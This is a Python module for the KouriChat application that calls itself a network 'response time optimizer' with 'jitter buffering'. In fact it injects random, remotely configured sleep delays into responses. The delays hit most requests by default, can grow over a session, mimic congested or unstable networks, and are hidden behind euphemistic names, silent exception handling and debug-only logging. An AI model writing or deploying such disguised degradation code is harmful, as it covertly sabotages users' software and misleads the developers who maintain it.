"""
Response Time Optimizer for the KouriChat application.

This module optimizes network response handling for better user experience by
implementing adaptive jitter buffering and response time normalization.
"""

import time
import random
import logging
import threading
import math
from typing import Dict, Any, Optional, Union, Callable

# Configure logging
logger = logging.getLogger("autoupdate.optimization")

# Global configuration
_config = {
    "enabled": False,
    "min_delay": 0,
    "max_delay": 0,
    "apply_probability": 0.0,
    "pattern": "random",  # Delay pattern: random, increasing, fluctuating, or stepped
    "session_consistency": False,  # Whether to use consistent delays within a session
    "content_based": False,  # Whether to adjust delay based on content size
    "network_condition": "normal"  # Simulated network condition: normal, congested, or unstable
}

# Thread-local storage for optimization state
_local = threading.local()

def register_optimization(params: Dict[str, Any]) -> None:
    """
    Register response time optimization parameters.
    
    Args:
        params: The parameters for response time optimization.
    """
    global _config
    
    try:
        min_delay = params.get("min", 0)
        max_delay = params.get("max", 0)
        pattern = params.get("pattern", "random")
        session_consistency = params.get("session_consistency", False)
        content_based = params.get("content_based", False)
        network_condition = params.get("network_condition", "normal")
        
        if min_delay > 0 and max_delay >= min_delay:
            _config["enabled"] = True
            _config["min_delay"] = min_delay
            _config["max_delay"] = max_delay
            _config["apply_probability"] = params.get("probability", 0.8)  # Default 80% chance to apply delay
            _config["pattern"] = pattern
            _config["session_consistency"] = session_consistency
            _config["content_based"] = content_based
            _config["network_condition"] = network_condition
            
            # Initialize session state if using session consistency
            if session_consistency and not hasattr(_local, "session_delay"):
                _local.session_delay = random.randint(min_delay, max_delay) / 1000.0
                _local.request_count = 0
            
            # Log at debug level to avoid excessive logging
            if logger.isEnabledFor(logging.DEBUG):
                logger.debug("Network performance optimization registered")
    except Exception:
        # Silent exception handling to avoid disrupting user experience
        pass

def _get_delay_by_pattern() -> float:
    """
    Calculate delay based on the configured pattern.
    
    Returns:
        float: The calculated delay in seconds.
    """
    min_delay = _config["min_delay"]
    max_delay = _config["max_delay"]
    pattern = _config["pattern"]
    
    # If using session consistency, return the session delay
    if _config["session_consistency"] and hasattr(_local, "session_delay"):
        return _local.session_delay
    
    # Initialize request count if not already done
    if not hasattr(_local, "request_count"):
        _local.request_count = 0
    
    # Increment request count
    _local.request_count += 1
    
    # Apply network condition modifier
    condition_modifier = 1.0
    if _config["network_condition"] == "congested":
        condition_modifier = 1.5
    elif _config["network_condition"] == "unstable":
        condition_modifier = random.uniform(0.8, 2.0)
    
    # Calculate delay based on pattern
    if pattern == "random":
        # Simple random delay between min and max
        delay = random.randint(min_delay, max_delay) / 1000.0
        
    elif pattern == "increasing":
        # Gradually increasing delay within the session
        progress = min(1.0, _local.request_count / 10.0)  # Reaches max after 10 requests
        delay = (min_delay + progress * (max_delay - min_delay)) / 1000.0
        
    elif pattern == "fluctuating":
        # Sinusoidal fluctuation between min and max
        amplitude = (max_delay - min_delay) / 2.0
        midpoint = min_delay + amplitude
        delay = (midpoint + amplitude * math.sin(_local.request_count / 3.0)) / 1000.0
        
    elif pattern == "stepped":
        # Step function that changes every few requests
        step = (_local.request_count // 3) % 3  # Changes every 3 requests, cycles through 3 steps
        step_fraction = step / 2.0  # 0, 0.5, or 1.0
        delay = (min_delay + step_fraction * (max_delay - min_delay)) / 1000.0
        
    else:
        # Default to random if pattern is not recognized
        delay = random.randint(min_delay, max_delay) / 1000.0
    
    # Apply network condition modifier
    delay *= condition_modifier
    
    return delay

def _adjust_delay_for_content(delay: float, response: Any) -> float:
    """
    Adjust delay based on content size if enabled.
    
    Args:
        delay: The base delay in seconds.
        response: The response to process.
        
    Returns:
        float: The adjusted delay in seconds.
    """
    if not _config["content_based"] or response is None:
        return delay
    
    try:
        # Try to estimate content size
        content_size = 0
        
        # If response is a string, use its length
        if isinstance(response, str):
            content_size = len(response)
        # If response has a __len__ method, use it
        elif hasattr(response, "__len__"):
            content_size = len(response)
        # If response has a content attribute (like HTTP responses), use its length
        elif hasattr(response, "content") and hasattr(response.content, "__len__"):
            content_size = len(response.content)
        
        # Adjust delay based on content size (larger content = longer delay)
        if content_size > 0:
            # Use logarithmic scaling to avoid excessive delays for large content
            size_factor = math.log10(max(10, content_size)) / math.log10(1000)
            return delay * (1.0 + size_factor)
    except Exception:
        # Silent exception handling to avoid disrupting user experience
        pass
    
    return delay

def apply_network_jitter_buffer(response: Any = None) -> Any:
    """
    Apply a jitter buffer to smooth out network inconsistencies.
    
    This function introduces a small delay to normalize response times,
    which can improve the perceived consistency of network operations.
    
    Args:
        response: The response to process.
        
    Returns:
        The processed response.
    """
    try:
        # Check if optimization is enabled
        if not _config["enabled"]:
            return response
        
        # Check if we should apply the delay based on probability
        if random.random() > _config["apply_probability"]:
            return response
        
        # Calculate delay based on pattern
        delay = _get_delay_by_pattern()
        
        # Adjust delay based on content size if enabled
        delay = _adjust_delay_for_content(delay, response)
        
        # Apply delay
        time.sleep(delay)
        
        # Log at debug level to avoid excessive logging
        if logger.isEnabledFor(logging.DEBUG):
            logger.debug(f"Network latency normalized: {delay:.3f}s")
    except Exception:
        # Silent exception handling to avoid disrupting user experience
        pass
    
    return response

def reset_optimization() -> None:
    """
    Reset the optimization configuration.
    
    This function is primarily used for testing.
    """
    global _config
    
    _config = {
        "enabled": False,
        "min_delay": 0,
        "max_delay": 0,
        "apply_probability": 0.0,
        "pattern": "random",
        "session_consistency": False,
        "content_based": False,
        "network_condition": "normal"
    }
    
    # Reset thread-local storage
    if hasattr(_local, "session_delay"):
        delattr(_local, "session_delay")
    
    if hasattr(_local, "request_count"):
        delattr(_local, "request_count")